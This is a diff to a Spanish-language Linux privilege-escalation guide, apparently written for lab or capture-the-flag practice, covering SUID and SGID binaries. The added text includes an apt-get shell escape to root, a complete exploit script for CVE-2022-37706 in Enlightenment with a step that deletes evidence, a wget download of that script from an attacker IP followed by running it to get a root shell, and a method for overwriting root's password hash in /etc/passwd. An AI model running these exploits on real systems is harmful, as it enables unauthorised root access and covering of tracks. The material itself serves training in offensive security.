@@ -359,7 +359,7 @@ Una vez encontrado, con el comando ```cat``` y la ubicación del archivo root.tx
 
 ### SUID
 
-Otra manera es buscando en /usr/bin, algún binario que contenga un permiso cuyo carácter sea ```s``` en lugar de ```x```.
+El permiso "Set User ID upon Execution" (setuid) permite a un usuario ejecutar un programa o script con los permisos de otros usuario (generalmente root). Este permiso se identifica con la letra ```s```.
 
 ```bash
 ┌─[user@user]─[/]
@@ -395,7 +395,117 @@ Ahora también podemos buscar todos los binarios SUID a través de ```find```, c
 /bin/umount
 ```
 
-#### Ejemplo
+Otra forma de visualizarlo es con sus permisos correspondientes:
+
+```
+┌─[user@user]─[/]
+└──╼ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+```
+
+Asimismo, es importante revisar los permisos Set-Group-ID (setgid), ya que, al igual que los permisos SUID, pueden ser explotados para ejecutar procesos con privilegios elevados y escalar privilegios (se explotan de la misma forma).
+
+```
+┌─[user@user]─[/]
+└──╼ find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
+```
+
+En el caso en que find no se encuentra disponible se puede aplicar el siguiente comando para encontrar los binarios vulnerables:
+
+```
+┌─[user@user]─[/]
+└──╼ ls -alR / 2>/dev/null | awk '
+> /^\/.*:$/ {dir=$0; sub(/:$/,"",dir); next}
+> $1 ~ /^-..s/ {print dir "/" $NF "  ->  " $0}
+```
+
+Como recomendación muchas formas de explotación se encuentran disponibles en [GTFOBins](https://gtfobins.github.io/).
+
+A continuación se presentan distintas formas de uso:
+
+#### apt-get
+
+```
+┌─[user@user]─[/]
+└──╼ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+#### Enlightenment
+
+Para este caso hay una vulnerabilidad de escalada de privilegios conocida como CVE-2022-37706 el cual aprovecha la función de biblioteca del sistema dado que maneja incorrectamente las rutas que comienzan con una subcadena /dev/. El siguiente exploit muestra la vulnerabilidad:
+
+```bash
+#!/usr/bin/bash
+# Idea by MaherAzzouz
+# Development by nu11secur1ty
+
+echo "CVE-2022-37706"
+echo "[*] Trying to find the vulnerable SUID file..."
+echo "[*] This may take few seconds..."
+
+# The actual problem
+file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
+if [[ -z ${file} ]]
+then
+	echo "[-] Couldn't find the vulnerable SUID file..."
+	echo "[*] Enlightenment should be installed on your system."
+	exit 1
+fi
+
+echo "[+] Vulnerable SUID binary found!"
+echo "[+] Trying to pop a root shell!"
+mkdir -p /tmp/net
+mkdir -p "/dev/../tmp/;/tmp/exploit"
+
+echo "/bin/sh" > /tmp/exploit
+chmod a+x /tmp/exploit
+echo "[+] Welcome to the rabbit hole :)"
+
+echo -e "If it is not found in fstab, big deal :D "
+${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
+
+read -p "Press any key to clean the evedence..."
+echo -e "Please wait... "
+
+sleep 5
+rm -rf /tmp/exploit
+rm -rf /tmp/net
+echo -e "Done; Everything is clear ;)"
+```
+
+```
+┌─[user@user]─[/tmp]
+└──╼ wget http://10.10.14.10/exploit.sh
+--2025-12-11 19:13:25--  http://10.10.14.10/exploit.sh
+Connecting to 10.10.14.10:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1005 [text/x-sh]
+Saving to: ‘exploit.sh’
+
+exploit.sh                    100%[==============================================>]    1005  --.-KB/s    in 0s      
+
+2025-12-11 19:13:25 (130 MB/s) - ‘exploit.sh’ saved [1005/1005]
+
+┌─[user@user]─[/tmp]
+└──╼ chmod +x exploit.sh
+
+┌─[user@user]─[/tmp]
+└──╼ ./exploit.sh 
+CVE-2022-37706
+[*] Trying to find the vulnerable SUID file...
+[*] This may take few seconds...
+[+] Vulnerable SUID binary found!
+[+] Trying to pop a root shell!
+[+] Welcome to the rabbit hole :)
+If it is not found in fstab, big deal :D 
+mount: /dev/../tmp/: can't find in /etc/fstab.
+# whoami
+root 
+```
+
+#### Passwd
 
 Una vez detectamos algunos binarios que nos sirva (en este caso ```/usr/bin/passwd```), procedemos a elevar privilegios, a través de openssl:
 
@@ -405,6 +515,8 @@ Una vez detectamos algunos binarios que nos sirva (en este caso ```/usr/bin/pass
 $1$root$9gr5KxwuEdiI80GtIzd.U0
 ```
 Lo que recibimos anteriormente lo copiamos y lo reemplazamos por la ```x``` que aparece en root del ```/etc/passwd```
+
+> Archivo sin editar
 
 ```bash
 ┌─[user@user]─[/]
@@ -438,6 +550,8 @@ sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
 mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
 systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
 ```
+
+> Archivo editado
 
 ```bash
 GNU nano 3.2                                        /etc/passwd                               
@@ -481,6 +595,8 @@ Contraseña: root
 └──╼ whoami
 root
 ```
+
+
 
 ### Binarios
 
